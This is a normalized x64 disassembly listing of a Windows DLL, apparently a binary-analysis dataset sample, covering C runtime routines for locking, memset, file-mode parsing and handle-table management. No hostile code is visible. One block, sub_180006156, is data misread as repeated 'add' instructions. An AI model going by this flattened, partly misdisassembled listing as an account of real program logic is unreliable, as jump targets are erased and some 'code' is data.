mov rcx [ rsp + 0x28 ]
call sub_180002aa0
mov rdx rax
mov rcx [ rsp + 0x40 ]
call sub_180002a70
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x40 ]
call sub_1800029d0
mov rax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_1800054d0
push rbx
sub rsp 0x20
and edx 0x3
mov rbx rcx
movsxd rax edx
mov [ rcx ] edx
lea rdx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rdx * 8 ]
call EnterCriticalSection
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180005550
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov [ rcx ] rax
cmp [ rcx + 0x38 ] 0x10
jb r-xdata
mov [ rbx + 0x38 ] 0xf
mov [ rbx + 0x30 ] 0x0
mov rcx rbx
mov [ rbx + 0x20 ] 0x0
add rsp 0x20
pop rbx
jmp sub_180007770
mov rcx [ rcx + 0x20 ]
call j_sub_1800085f0#2
sub_1800055a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov edi edx
mov rbx rcx
mov [ rcx ] rax
cmp [ rcx + 0x38 ] 0x10
jb r-xdata
mov [ rbx + 0x38 ] 0xf
mov [ rbx + 0x30 ] 0x0
mov rcx rbx
mov [ rbx + 0x20 ] 0x0
call sub_180007770
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x20 ]
call j_sub_1800085f0#2
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_1800085f0#2
sub_180005610
sub rsp 0x98
mov [ rsp + 0x20 ] 0xfffffffffffffffe
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800033a0
nop
lea rcx [ rsp + 0x50 ]
call sub_1800075f0
nop
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x88 ] 0xf
mov [ rsp + 0x80 ] 0x0
mov [ rsp + 0x70 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x68 ]
call sub_180003490
nop
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x50 ]
call sub_180007410
int3
sub_1800056e0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rdx
mov rdi rcx
call sub_1800076c0
nop
lea rax [ r--data ]
mov [ rdi ] rax
lea rdx [ rbx + 0x18 ]
lea rcx [ rdi + 0x18 ]
mov [ rcx + 0x20 ] 0xf
mov [ rcx + 0x18 ] 0x0
mov [ rcx + 0x8 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180003490
nop
mov rax rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180005770
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rdx
mov rdi rcx
call sub_1800076c0
nop
lea rax [ r--data ]
mov [ rdi ] rax
lea rdx [ rbx + 0x18 ]
lea rcx [ rdi + 0x18 ]
mov [ rcx + 0x20 ] 0xf
mov [ rcx + 0x18 ] 0x0
mov [ rcx + 0x8 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180003490
nop
lea rax [ r--data ]
mov [ rdi ] rax
mov rax rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180005800
sub rsp 0x98
mov [ rsp + 0x20 ] 0xfffffffffffffffe
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800033a0
nop
lea rcx [ rsp + 0x50 ]
call sub_1800075f0
nop
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
mov [ rsp + 0x88 ] 0xf
mov [ rsp + 0x80 ] 0x0
mov [ rsp + 0x70 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x68 ]
call sub_180003490
nop
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x50 ]
call sub_180007410
int3
sub_1800058d0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rdx
mov rdi rcx
call sub_1800076c0
nop
lea rax [ r--data ]
mov [ rdi ] rax
lea rdx [ rbx + 0x18 ]
lea rcx [ rdi + 0x18 ]
mov [ rcx + 0x20 ] 0xf
mov [ rcx + 0x18 ] 0x0
mov [ rcx + 0x8 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180003490
nop
lea rax [ r--data ]
mov [ rdi ] rax
mov rax rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_1800059c0
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_180005ab0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] rcx
push rdi
push r12
push r13
sub rsp 0x30
mov rsi r9
mov edi r8d
mov r13 rdx
mov rbx rcx
xor r12d r12d
mov eax r12d
test rcx rcx
setne al
test eax eax
jne r-xdata
cmp r8d 0x4
je r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r12
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
test r8d r8d
je r-xdata
test r8d r8d
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
lea rax [ r9 - 0x2 ]
cmp rax 0x7ffffffd
jbe r-xdata
cmp r8d 0x40
jne r-xdata
cmp r8d 0x40
je r-xdata
and rsi 0xfffffffffffffffe
call sub_180005d90
nop
mov rcx rbx
call sub_1800089d0
mov rcx rbx
call sub_180008990
and [ rbx + 0x18 ] 0xffffc2f3
mov eax [ rbx + 0x18 ]
test dil 0x4
je r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r12
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] r12
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
or eax 0xffffffff
jmp r-xdata
test r13 r13
jne r-xdata
or eax 0x4
mov [ rbx + 0x18 ] eax
lea r13 [ rbx + 0x20 ]
mov esi 0x2
mov [ rsp + 0x68 ] rsi
jmp r-xdata
or eax 0x500
mov [ rbx + 0x18 ] eax
mov rcx rsi
call sub_180008800
mov r13 rax
test rax rax
jne r-xdata
mov [ rbx + 0x24 ] esi
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13
mov [ rbx + 0x8 ] r12d
or [ rbx + 0x18 ] 0x408
jmp r-xdata
add [ rw-data ] 0x1
or r12d 0xffffffff
jmp r-xdata
mov rcx rbx
call sub_180005e40
mov eax r12d
sub_180005c60
push rbx
sub rsp 0x20
mov eax [ rw-data ]
mov ebx 0x14
test eax eax
jne r-xdata
cmp eax ebx
cmovl eax ebx
mov eax 0x200
jmp r-xdata
xor r8d r8d
lea rdx [ rw-data ]
mov rcx r8
nop
nop
nop
lea edx [ rax + 0x8 ]
mov rcx rbx
mov [ rw-data ] ebx
call sub_180008870
test rax rax
mov [ rw-data ] rax
jne r-xdata
movsxd rcx eax
mov edx 0x8
mov [ rw-data ] eax
call sub_180008870
test rax rax
mov [ rw-data ] rax
jne r-xdata
lea rdx [ rw-data ]
mov r10d 0x3
lea r11 [ rw-data ]
nop
mov rax [ rw-data ]
jmp r-xdata
mov eax 0x1a
add rsp 0x20
pop rbx
retn
mov [ rdx ] 0xfffffffe
cmp r9 0xfffffffffffffffe
je r-xdata
mov [ rcx + rax ] rdx
add rcx 0x8
add rdx 0x30
sub rbx 0x1
je r-xdata
mov cl r8b
mov rax r8
sar rax 0x5
and ecx 0x1f
mov rax [ r11 + rax * 8 ]
imul rcx rcx 0x58
mov r9 [ rcx + rax ]
cmp r9 0xffffffffffffffff
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
test r9 r9
jne r-xdata
add r8 0x1
add rdx 0x30
sub r10 0x1
jne r-xdata
sub_180005d90
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rw-data ]
cmp rbx rcx
jb r-xdata
lea rcx [ rbx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rbx rax
ja r-xdata
mov rdx rbx
mov rax 0x2aaaaaaaaaaaaaab
sub rdx rcx
imul rdx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
call sub_180009ab0
or [ rbx + 0x18 ] 0x8000
add rsp 0x20
pop rbx
retn
sub_180005e00
push rbx
sub rsp 0x20
cmp ecx 0x14
mov rbx rdx
jge r-xdata
lea rcx [ rdx + 0x30 ]
add rsp 0x20
pop rbx
jmp [ EnterCriticalSection@IAT ]
add ecx 0x10
call sub_180009ab0
or [ rbx + 0x18 ] 0x8000
add rsp 0x20
pop rbx
retn
sub_180005e40
lea rdx [ rw-data ]
cmp rcx rdx
jb r-xdata
add rcx 0x30
jmp [ LeaveCriticalSection@IAT ]
lea rax [ rw-data ]
cmp rcx rax
ja r-xdata
and [ rcx + 0x18 ] 0xffff7fff
sub rcx rdx
mov rax 0x2aaaaaaaaaaaaaab
imul rcx
sar rdx 0x3
mov rcx rdx
shr rcx 0x3f
lea ecx [ rcx + rdx + 0x10 ]
jmp sub_180009980
sub_180005eb0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
movsxd rsi ecx
xor ebx ebx
mov eax ebx
test rdx rdx
setne al
test eax eax
jne r-xdata
cmp esi 0xfffffffe
jne r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
xor eax eax
jmp r-xdata
test ecx ecx
js r-xdata
call sub_180008e80
mov [ rax ] 0x9
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
call sub_180008e80
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
xor eax eax
cmp esi [ rw-data ]
jae r-xdata
mov rcx rsi
mov rax rsi
sar rax 0x5
lea r11 [ __dos_header ]
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r11 + rax * 8 + 0x1ccc0 ]
mov cl [ rax + rcx + 0x8 ]
and ecx 0x1
jne r-xdata
cmp [ rdx ] 0x20
jne r-xdata
call sub_180008e80
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
xor eax eax
jmp r-xdata
mov al [ rdx ]
cmp al 0x61
je r-xdata
add rdx 0x1
cmp [ rdx ] 0x20
je r-xdata
mov edi 0x2
cmp al 0x72
je r-xdata
cmp [ rdx ] 0x20
jne r-xdata
nop
mov edi 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
mov eax ebx
cmp [ rdx ] al
sete al
test eax eax
jne r-xdata
add rdx 0x1
cmp [ rdx ] 0x20
je r-xdata
movsx eax al
add eax 0xffffffe0
cmp eax 0x54
ja r-xdata
mov r8d 0x1
mov r9d ebx
mov r10d ebx
or edi [ rw-data ]
add rdx r8
movzx eax [ rdx ]
test al al
je r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
xor eax eax
jmp r-xdata
call sub_180009b00
mov rbx rax
mov [ rsp + 0x48 ] rax
test rax rax
jne r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
xor eax eax
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d20
xor eax eax
jmp r-xdata
cdqe
movzx eax [ r11 + rax + 0x6150 ]
mov ecx [ r11 + rax * 4 + 0x6138 ]
add rcx r11
jmp rcx
add [ rw-data ] 0x1
mov [ rax + 0x18 ] edi
mov [ rax + 0x1c ] esi
mov rcx rax
call sub_180005e40
mov rax rbx
jmp r-xdata
call sub_180008e80
mov [ rax ] 0x18
xor eax eax
jmp r-xdata
test dil dil
jns r-xdata
test r10d r10d
je r-xdata
test r9d r9d
je r-xdata
test r9d r9d
je r-xdata
add rdx 0x1
mov al [ rdx ]
test al al
je r-xdata
and edi 0xfffffffc
bts edi 0x7
jmp r-xdata
mov r8d ebx
jmp r-xdata
mov r10d 0x1
jmp r-xdata
mov r8d ebx
jmp r-xdata
mov r9d 0x1
bts edi 0xe
jmp r-xdata
mov r8d ebx
jmp r-xdata
mov r9d 0x1
btr edi 0xe
mov r8d ebx
jmp r-xdata
jmp r-xdata
test r8d r8d
je r-xdata
sub_180006156
add eax 0x5050505
add [ 0x185056666 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x2050505
add eax [ 0x18505669e ]
add eax 0x5050505
add al 0x5
add eax 0x2050505
int3
sub_1800061d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test ecx ecx
mov rbx rdx
js r-xdata
call sub_180008e80
mov [ rax ] 0x9
call sub_180008eb0
mov [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rax ecx
lea rbp [ rw-data ]
mov dil al
mov rsi rax
sar rsi 0x5
and edi 0x1f
mov rax [ rbp + rsi * 8 ]
imul rdi rdi 0x58
cmp [ rdi + rax ] 0xffffffffffffffff
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rsi * 8 ]
mov [ rdi + rax ] rbx
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
sub ecx 0x1
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
cmp ecx 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_180006290
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_180008e80
mov [ rax ] 0x9
call sub_180008eb0
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov [ rax ] 0x0
or eax 0xffffffff
add rsp 0x20
pop rdi
retn
cmp ecx [ rw-data ]
jae r-xdata
movsxd rax ecx
lea rsi [ rw-data ]
mov bl al
mov rdi rax
sar rdi 0x5
and ebx 0x1f
mov rax [ rsi + rdi * 8 ]
imul rbx rbx 0x58
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rsi + rdi * 8 ]
mov [ rbx + rax ] 0xffffffffffffffff
xor eax eax
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test ecx ecx
je r-xdata
mov ecx 0xfffffff6
sub ecx 0x1
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_180006360
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180008eb0
mov [ rax ] 0x0
call sub_180008e80
mov [ rax ] 0x9
or rax 0xffffffffffffffff
add rsp 0x38
retn
call sub_180008eb0
mov [ rax ] 0x0
call sub_180008e80
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
mov [ rsp + 0x20 ] 0x0
call sub_180008d20
or rax 0xffffffffffffffff
add rsp 0x38
retn
cmp ecx [ rw-data ]
jae r-xdata
movsxd rax ecx
lea rdx [ rw-data ]
mov rcx rax
and eax 0x1f
sar rcx 0x5
imul rax rax 0x58
mov rdx [ rdx + rcx * 8 ]
test [ rdx + rax + 0x8 ] 0x1
je r-xdata
mov rax [ rdx + rax ]
add rsp 0x38
retn
sub_180006400
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r12
push r13
sub rsp 0x20
movsxd rax ecx
mov r12 rax
sar r12 0x5
lea r13 [ rw-data ]
mov dil al
and edi 0x1f
imul rdi rdi 0x58
mov rsi [ r13 + r12 * 8 ]
mov ebx 0x1
cmp [ rdi + rsi + 0xc ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
lea ecx [ rbx + 0x9 ]
call sub_180009ab0
nop
cmp [ rdi + rsi + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r13
retn
mov rcx [ r13 + r12 * 8 ]
lea rcx [ rcx + rdi + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_180009980
lea rcx [ rdi + rsi + 0x10 ]
mov edx 0xfa0
call sub_180009cd0
xor ecx ecx
test eax eax
cmove ebx ecx
add [ rdi + rsi + 0xc ] 0x1
sub_180006500
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x40
or rdi 0xffffffffffffffff
mov r14d edi
xor esi esi
lea ecx [ rdi + 0xc ]
call sub_1800099a0
test eax eax
jne r-xdata
mov ecx 0xb
call sub_180009ab0
nop
xor r12d r12d
mov [ rsp + 0x24 ] r12d
lea r15 [ rw-data ]
mov eax edi
jmp r-xdata
mov ecx 0xb
call sub_180009980
mov eax r14d
movsxd r13 r12d
mov rbx [ r15 + r13 * 8 ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
retn
mov edx 0x58
lea ecx [ rdx - 0x38 ]
call sub_180008870
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x30 ] rbx
movsxd rdx r12d
mov [ r15 + rdx * 8 ] rax
add [ rw-data ] 0x20
xor r8d r8d
nop
nop
cmp r14d 0xffffffff
jne r-xdata
test [ rbx + 0x8 ] 0x1
jne r-xdata
shl r12d 0x5
mov [ rsp + 0x20 ] r12d
movsxd rax r12d
mov rdx rax
sar rdx 0x5
mov cl al
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r15 + rdx * 8 ]
mov [ rax + rcx + 0x8 ] 0x1
mov ecx r12d
call sub_180006400
test eax eax
cmove r12d edi
mov r14d r12d
mov [ rsp + 0x20 ] r12d
mov [ rax + 0x8 ] r8b
mov [ rax ] rdi
mov [ rax + 0x9 ] 0xa
mov [ rax + 0xc ] r8d
add rax 0x58
mov [ rsp + 0x30 ] rax
jmp r-xdata
add r12d 0x1
mov [ rsp + 0x24 ] r12d
jmp r-xdata
add rbx 0x58
mov [ rsp + 0x30 ] rbx
or rdi 0xffffffffffffffff
jmp r-xdata
cmp [ rbx + 0xc ] 0x0
jne r-xdata
mov rcx [ r15 + rdx * 8 ]
add rcx 0xb00
cmp rax rcx
jae r-xdata
cmp r12d 0x40
jge r-xdata
mov rax [ r15 + r13 * 8 ]
add rax 0xb00
cmp rbx rax
jae r-xdata
test esi esi
jne r-xdata
mov ecx 0xa
call sub_180009ab0
nop
cmp [ rbx + 0xc ] 0x0
jne r-xdata
test esi esi
jne r-xdata
lea rcx [ rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
test [ rbx + 0x8 ] 0x1
je r-xdata
mov ecx 0xa
call sub_180009980
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call sub_180009cd0
test eax eax
jne r-xdata
mov [ rbx + 0x8 ] 0x1
mov [ rbx ] rdi
sub rbx [ r15 + r13 * 8 ]
mov rax 0x2e8ba2e8ba2e8ba3
imul rbx
mov r14 rdx
sar r14 0x4
mov rax r14
shr rax 0x3f
add r14 rax
mov eax r12d
shl eax 0x5
add r14d eax
mov [ rsp + 0x20 ] r14d
jmp r-xdata
or rdi 0xffffffffffffffff
lea rcx [ rbx + 0x10 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
add [ rbx + 0xc ] 0x1
mov esi 0x1
mov [ rsp + 0x28 ] esi
jmp r-xdata
sub_180006770
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rsi rcx
mov [ rsp + 0x20 ] 0x0
xor al al
test dl 0x8
movzx ebx al
mov eax 0x20
cmovne ebx eax
bt edx 0xe
jae r-xdata
test dl dl
jns r-xdata
or bl 0x80
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_180008ee0
or eax 0xffffffff
jmp r-xdata
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
call sub_180006500
movsxd rdi eax
mov [ rsp + 0x48 ] edi
cmp edi 0xffffffff
jne r-xdata
or bl 0x8
mov rdx rsi
mov ecx edi
call sub_1800061d0
or bl 0x1
mov rdx rdi
sar rdx 0x5
lea r9 [ rw-data ]
mov cl dil
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r9 + rdx * 8 ]
mov [ rax + rcx + 0x8 ] bl
mov rax [ r9 + rdx * 8 ]
and [ rax + rcx + 0x38 ] 0x80
mov rax [ r9 + rdx * 8 ]
and [ rax + rcx + 0x38 ] 0x7f
mov [ rsp + 0x20 ] 0x1
mov rax [ r9 + rdx * 8 ]
lea rcx [ rax + rcx + 0x10 ]
call [ LeaveCriticalSection@IAT ]
mov eax edi
call sub_180008e80
mov [ rax ] 0x18
call sub_180008eb0
mov [ rax ] 0x0
or eax edi
jmp r-xdata
sub_180006870
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
mov r8d [ rbp + 0x48 ]
movsxd r8 [ rbp + 0x48 ]
mov rdx r8
sar rdx 0x5
lea r9 [ rw-data ]
mov cl r8b
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r9 + rdx * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
jmp r-xdata
mov ecx r8d
call sub_1800064d0
add rsp 0x20
pop rbp
retn
sub_1800068c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_180007990
test [ rbp + 0x4 ] 0x66
mov r11d [ rbx + 0x4 ]
jne r-xdata
and r11d 0x2
and r11d 0x1
jmp r-xdata
mov eax 0x1
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_180006c70
jmp r-xdata
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_180006990
mov [ rsp + 0x20 ] rbp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov r12 r9
mov r14 r8
mov r13 rdx
call sub_180009fd0
test edi edi
mov r10 [ r15 ]
mov [ r12 ] r10
mov ebp eax
je r-xdata
mov rax r12
mov rbp [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
mov [ rsp + 0x58 ] rbx
mov [ rsp + 0x60 ] rsi
lea rsi [ rcx * 4 - 0x14 ]
nop
nop
nop
nop
sub rsi 0x14
add edi 0xffffffff
jne r-xdata
cmp ebp [ rbx + 0x8 ]
jg r-xdata
movsxd rbx [ r14 + 0x10 ]
add rbx [ r13 + 0x8 ]
add rbx rsi
cmp ebp [ rbx + 0x4 ]
jle r-xdata
jmp r-xdata
mov rcx [ r13 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r10 [ rbx + 0x10 ]
mov r8d [ rbx + 0xc ]
add r10 [ rsp + 0x50 ]
mov r9d [ rax ]
xor edx edx
test r8d r8d
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rax r12
mov rbp [ rsp + 0x68 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp edx r8d
jb r-xdata
lea rcx [ r10 + 0xc ]
mov rax [ r15 ]
lea rcx [ rdx + rdx * 4 ]
movsxd rcx [ r10 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ r12 ] rcx
add edx 0x1
add rcx 0x14
cmp edx r8d
jb r-xdata
movsxd rax [ rcx ]
cmp rax r9
je r-xdata
sub_180006b20
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r14 rcx
mov rcx r8
mov rbp r8
mov r13 rdx
call sub_180009fd0
test edi edi
mov r9 [ r14 ]
mov r12d eax
mov [ rsp + 0x50 ] r9
je r-xdata
mov rdx r13
mov rcx rbp
call sub_180009fd0
movsxd rbx [ rbp + 0xc ]
test ebx ebx
mov esi eax
je r-xdata
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
nop
nop
or r9d 0xffffffff
lea rcx [ rbx + rbx * 4 ]
lea rdi [ rcx * 4 - 0x14 ]
nop
sub rsi 0x14
add edi 0xffffffff
jne r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
sub rdi 0x14
add ebx 0xffffffff
jne r-xdata
cmp esi [ rdx + rdi + 0x8 ]
jle r-xdata
movsxd rbx [ rbp + 0x10 ]
add rbx [ r13 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
jmp r-xdata
mov rcx [ r13 ]
lea rdx [ rsp + 0x60 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r10 [ rbx + 0x10 ]
mov r8d [ rbx + 0xc ]
add r10 [ rsp + 0x60 ]
mov r9d [ rax ]
xor edx edx
test r8d r8d
je r-xdata
call sub_18000a690
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
cmp esi [ rdx + rdi + 0x4 ]
jle r-xdata
mov r9d [ rdx + rdi + 0x4 ]
jmp r-xdata
cmp edx r8d
jb r-xdata
lea rcx [ r10 + 0xc ]
lea rcx [ rsp + 0x50 ]
mov r8 rbp
mov rdx r13
call sub_18000ae10
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ r14 ]
